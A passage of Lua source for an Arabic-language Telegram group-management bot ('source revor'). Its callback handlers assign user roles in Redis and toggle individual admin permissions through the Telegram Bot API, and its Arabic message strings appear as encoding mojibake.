database:sadd(bot_id.."Muted:User"..msg.chat_id_, users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΩΨͺΩΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('mah@(%d+)/mhh@(%d+)/setspecial') and Admin(msg) then
local users = {string.match(Text,"^mah@(%d+)/mhh@(%d+)/setspecial$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
database:sadd(bot_id.."Special:User"..msg.chat_id_, users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('mah@(%d+)/mhh@(%d+)/aetadmin') and Manger(msg) then
local users = {string.match(Text,"^mah@(%d+)/mhh@(%d+)/aetadmin$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('mah@(%d+)/mhh@(%d+)/gsetma') and DevBot(msg) then
local users = {string.match(Text,"^mah@(%d+)/mhh@(%d+)/gsetma$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
database:sadd(bot_id.."Manager"..msg.chat_id_, users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('mah@(%d+)/mhh@(%d+)/metmonsh') and SupCreator(msg) then
local users = {string.match(Text,"^mah@(%d+)/mhh@(%d+)/metmonsh$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
database:sadd(bot_id.."Creator"..msg.chat_id_, users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('mah@(%d+)/mhh@(%d+)/ketmonshs') and DevBot(msg) then
local users = {string.match(Text,"^mah@(%d+)/mhh@(%d+)/ketmonshs$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
database:sadd(bot_id.."Basic:Creator"..msg.chat_id_, users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/setiinginfo') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/setiinginfo$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('mah@(%d+)/mhh@(%d+)/detdev') and Devss(msg) then
local users = {string.match(Text,"^mah@(%d+)/mhh@(%d+)/detdev$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
database:sadd(bot_id.."Sudo:User", users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± ΩΩ Ψ§ΩΨ¨ΩΨͺ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('mah@(%d+)/mhh@(%d+)/oetowner') and DevBot(msg) then
local users = {string.match(Text,"^mah@(%d+)/mhh@(%d+)/oetowner$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
database:sadd(bot_id.."Basic:Creator23"..msg.chat_id_, users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ§ΩΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('mah@(%d+)/mhh@(%d+)/fetdevs') and DevSonic(msg) then
local users = {string.match(Text,"^mah@(%d+)/mhh@(%d+)/fetdevs$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
database:sadd(bot_id.."DEV:Sudo:T", users[2])
tdcli_function ({ID = "GetUser",user_id_ = users[2],},function(arg,mahmoud) 
local m = 'Ω­ Ψ§ΩΨΉΨΆΩ ['..mahmoud.first_name_..'](tg://user?id='..mahmoud.id_..')\n Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'source revor', url = "https://t.me/revorb0t"}
},
}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(m)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil)
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/voicetrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicetrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = '&can_manage_voice_chats=True'..manage..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/voicefalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicefalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = '&can_manage_voice_chats=false'..manage..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/managetrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/managetrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..'&can_manage_chat=True'..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/managefalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/managefalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..'&can_manage_chat=false'..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addadmintrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addadmintrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage..infoo..deletee..invitee..restrictt..pinn..'&can_promote_members=true' 
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/chenginfotrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/chenginfotrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage..'&can_change_info=True' ..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/delmsggtrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/delmsggtrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..'&can_delete_messages=True' ..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/banusertrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/banusertrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..'&can_restrict_members=True' ..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/pinmsgtrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/pinmsgtrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..'&can_pin_messages=True' ..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addlinktrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addlinktrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..'&can_invite_users=True' ..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end


if Text and Text:match('amr@(%d+)/user@(%d+)/addadminfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addadminfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
if manage then
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..pinn..'&can_promote_members=false'
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
end
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/chenginfofalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/chenginfofalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. '&can_change_info=false' ..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/delmsggfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/delmsggfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
